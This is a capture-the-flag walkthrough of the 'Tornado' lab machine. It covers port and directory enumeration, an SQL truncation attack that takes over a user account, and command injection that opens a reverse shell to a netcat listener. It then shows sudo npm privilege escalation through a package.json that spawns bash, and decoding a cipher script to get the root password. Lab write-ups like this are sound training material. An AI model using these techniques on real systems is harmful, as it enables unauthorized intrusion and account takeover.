***Target: `10.0.0.17`***

# 1. Enumeration

    root@kali ~# nmap -sS -p- -A -T4 10.0.0.17

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 0f:57:0d:60:31:4a:fd:2b:db:3e:9e:2f:63:2e:35:df (RSA)
    |   256 00:9a:c8:d3:ba:1b:47:b2:48:a8:88:24:9f:fe:33:cc (ECDSA)
    |_  256 6d:af:db:21:25:ee:b0:a6:7d:05:f3:06:f0:65:ff:dc (ED25519)
    80/tcp open  http    Apache httpd 2.4.38 ((Debian))
    |_http-title: Apache2 Debian Default Page: It works
    |_http-server-header: Apache/2.4.38 (Debian)

Let's scan the HTTP service.

    root@kali ~/D/M/Tornado# gobuster dir -u http://10.0.0.17/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php,bak

    /index.html           (Status: 200) [Size: 10701]
    /manual               (Status: 301) [Size: 307] [--> http://10.0.0.17/manual/]
    /javascript           (Status: 301) [Size: 311] [--> http://10.0.0.17/javascript/]
    /bluesky              (Status: 301) [Size: 308] [--> http://10.0.0.17/bluesky/]   
    /server-status        (Status: 403) [Size: 274] 

The directory '**bluesky**' seems interesting.

![image](https://user-images.githubusercontent.com/76552238/182822491-8afa01eb-2867-45ce-af8f-b61eee590e91.png)

Let's scan the directory.

    root@kali ~/D/M/Tornado [1]# gobuster dir -u http://10.0.0.17/bluesky -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php,bak

    /index.html           (Status: 200) [Size: 14979]
    /contact.php          (Status: 302) [Size: 2034] [--> login.php]
    /about.php            (Status: 302) [Size: 2024] [--> login.php]
    /login.php            (Status: 200) [Size: 824]                 
    /signup.php           (Status: 200) [Size: 825]                 
    /css                  (Status: 301) [Size: 312] [--> http://10.0.0.17/bluesky/css/]
    /imgs                 (Status: 301) [Size: 313] [--> http://10.0.0.17/bluesky/imgs/]
    /js                   (Status: 301) [Size: 311] [--> http://10.0.0.17/bluesky/js/]  
    /logout.php           (Status: 302) [Size: 0] [--> login.php]                       
    /dashboard.php        (Status: 302) [Size: 2024] [--> login.php]                    
    /port.php             (Status: 302) [Size: 2098] [--> login.php] 

Let's go to the **login.php** page.

![image](https://user-images.githubusercontent.com/76552238/183060812-97d232b5-009f-4023-95dd-31a8c8c20193.png)

An SQL Injection did not work here. Let's go to the **signup.php** page.

![image](https://user-images.githubusercontent.com/76552238/183061054-fced28fb-9bdb-41a0-b8aa-20ce3e70c2a8.png)

Let's try to register as a new user. I got a [**temporary email**][1] and tried to log in but the email was cut.

![image](https://user-images.githubusercontent.com/76552238/183061299-ce4ada91-ba67-45b3-9bca-fb3af6620bad.png)

Using the Dev tools we can see the max length of the input is 13 characters.

![image](https://user-images.githubusercontent.com/76552238/183061444-d28266f1-38e7-4dc7-aa0f-8f10369e1013.png)

This might mean that this web server is vulnerable to an [**SQL Truncation Attack**][2]. Since we don't have any users we know are on the remote server we cannot perform it just yet.  
Let's try to sign up normally with random credentials and log in.

![image](https://user-images.githubusercontent.com/76552238/183062047-ac07e765-24f5-4237-a4a9-2552e2f1e2c1.png)

Now that we are logged in we can go over the pages on the Dashboard. Going to the portfolio tab we are told that this site might have a LFI. 

![image](https://user-images.githubusercontent.com/76552238/183062281-218c3798-a2bc-4206-a70c-b03643dc55d0.png)

Using dev tools we can see a comment.

![image](https://user-images.githubusercontent.com/76552238/183062404-f3fc6677-5280-4599-8e0f-5e3940fa4c9b.png)

Going to **http://10.0.0.17/~tornado** we can read the file imp.txt.

![image](https://user-images.githubusercontent.com/76552238/182937724-d237093b-2725-4fcb-899e-c0c2ef59889b.png)

    root@kali ~/D/M/Tornado# wget http://10.0.0.17/~tornado/imp.txt
    root@kali ~/D/M/Tornado# cat imp.txt 

    ceo@tornado
    cto@tornado
    manager@tornado
    hr@tornado
    lfi@tornado
    admin@tornado
    jacob@tornado
    it@tornado
    sales@tornado

Let's see if one of the emails we found are registered on the web server.

![image](https://user-images.githubusercontent.com/76552238/183058022-d82de2a2-5388-448b-b2cd-4e671f9b4b10.png)

The email '**admin@tornado**' and the email **'jacob@tornado'** is register on the remote machine. We can use the SQL Truncation Attack on those emails and log in as a different password.

Let's try the attack on the email **jacob@tornado**, but first we need to change the character restriction in the form to more then 13.

![image](https://user-images.githubusercontent.com/76552238/183066294-ace7362c-6099-483b-ad20-424677eb8351.png)

    jacob@tornado   a:jacob

![image](https://user-images.githubusercontent.com/76552238/183066360-9e48ab31-3033-4be0-8b3e-3985313064dc.png)

Now let's log in as **'jacob@tornado'** with the password **'jacob'** and see if we have access.

![image](https://user-images.githubusercontent.com/76552238/183066490-b506a30a-a62b-46f2-a49c-e17e0ce48cd4.png)

![image](https://user-images.githubusercontent.com/76552238/183066542-552f6884-7cb2-446b-857d-b37c5348c0cf.png)

Going to the contact page we can enter a comment.

![image](https://user-images.githubusercontent.com/76552238/183066705-22a1872c-a084-4846-9eec-0768148a24ad.png)

After playing around with the input field, if we enter commands in the input box they will run on the remote machine. Let's set up a listener on our local machine and run **nc** using the RCE vulnerability we found on the remote machine.

![image](https://user-images.githubusercontent.com/76552238/183256010-2c603970-1a5d-4d1f-86ed-76de74be9815.png)

    root@kali ~/D/M/Tornado [1]# nc -lnvp 4444
    listening on [any] 4444 ...
    connect to [10.0.0.27] from (UNKNOWN) [10.0.0.17] 41636
    whoami
    www-data

# 2. Privilege Escalation

We are currently logged in as the user **www-data**. Going to the **/home** directory we can see there 2 more users on the remote machine.

    www-data@tornado:/home$ ls -l
    total 8
    drwx------ 4 catchme catchme 4096 Aug  6 20:32 catchme
    drwxrwxrwx 4 tornado tornado 4096 Aug  6 20:39 tornado

We don't have access to the directory **'catchme'**. Let's see what sudo permissions we have.

    www-data@tornado:/home$ sudo -ll
    Matching Defaults entries for www-data on tornado:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User www-data may run the following commands on tornado:

    Sudoers entry:
        RunAsUsers: catchme
        Options: !authenticate
        Commands:
            /usr/bin/npm

We can run the command [**npm**][3] as the user **'catchme'**.  
Searching for **"npm privilege escalation"** I found that npm has the option to run JavaScript files.  
All we need to do is make an **'index.js'** file and a **'package.json'** file and run them as the user **'catchme'** with the command npm.

    www-data@tornado:/tmp/exploit$ touch index.js
    www-data@tornado:/tmp/exploit$ cp index.js ./exploit
    www-data@tornado:/tmp/exploit$ cat package.json
    {
    "name": "packge",
    "version": "1.0.0",
    "description": "",
    "main": "index.js",
    "scripts": {
        "exploit": "/bin/bash"
    },
    "author": "",
    "license": "ISC"
    }

    catchme@tornado:/tmp$ id -a
    uid=1000(catchme) gid=1000(catchme) groups=1000(catchme),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)

    catchme@tornado:~$ cd ~
    catchme@tornado:~$ ls -l
    total 8
    -rwx------ 1 catchme catchme 961 Dec 10  2020 enc.py
    -rw------- 1 catchme catchme  15 Dec 10  2020 user.txt
    catchme@tornado:~$ cat user.txt
    HMVkeyedcaesar

On the user's home directory there a python script. Let's download it to our local machine by opening a python http server on the remote machine.

    Local Machine

    root@kali ~/D/M/Tornado [SIGINT]# wget http://10.0.0.17:8080/enc.py
    --2022-08-06 11:56:22--  http://10.0.0.17:8080/enc.py
    Connecting to 10.0.0.17:8080... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 961 [text/plain]
    Saving to: ‘enc.py’

    enc.py                     100%[=======================================>]     961  --.-KB/s    in 0.01s   

    2022-08-06 11:56:22 (84.5 KB/s) - ‘enc.py’ saved [961/961]
>
    Remote Machine

    python3 -m http.server 8080
    Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
    10.0.0.27 - - [06/Aug/2022 21:26:22] "GET /enc.py HTTP/1.1" 200 -
>
    root@kali ~/D/M/Tornado# cat enc.py 
    s = "abcdefghijklmnopqrstuvwxyz"
    shift=0
    encrypted="hcjqnnsotrrwnqc"
    #
    k = input("Input a single word key :")
    if len(k) > 1:
            print("Something bad happened!")
            exit(-1)

    i = ord(k)
    s = s.replace(k, '')
    s = k + s
    t = input("Enter the string to Encrypt here:")
    li = len(t)
    print("Encrypted message is:", end="")
    while li != 0:
            for n in t:
                    j = ord(n)
                    if j == ord('a'):
                            j = i
                            print(chr(j), end="")
                            li = li - 1

                    elif n > 'a' and n <= k:
                            j = j - 1
                            print(chr(j), end="")
                            li = li - 1

                    elif n > k:
                            print(n, end="")
                            li = li - 1

                    elif ord(n) == 32:
                            print(chr(32), end="")
                            li = li - 1

                    elif j >= 48 and j <= 57:
                            print(chr(j), end="")
                            li = li - 1

                    elif j >= 33 and j <= 47:
                            print(chr(j), end="")
                            li = li - 1

                    elif j >= 58 and j <= 64:
                            print(chr(j), end="")
                            li = li - 1

                    elif j >= 91 and j <= 96:
                            print(chr(j), end="")
                            li = li - 1

                    elif j >= 123 and j <= 126:
                            print(chr(j), end="")
                            li = li - 1

Taking the variable **'encrypted'**, and passing to a Ceaser Dechiper, one of the output we get is **'idkrootpussxord'**. Entering the correct password which is **'idkrootpassword'** we are able to get access to the root user.

    root@kali ~/D/M/Tornado# ssh root@10.0.0.17
    root@10.0.0.17's password: idkrootpassword
    root@tornado:~# id -a
    uid=0(root) gid=0(root) groups=0(root)

    root@tornado:~# cat root.txt 
    HMVgoodwork


[1]: "https://temp-mail.org/en/"
[2]: "https://linuxhint.com/sql-truncation-attack/"
[3]: "https://www.unix.com/man-page/linux/1/npm/"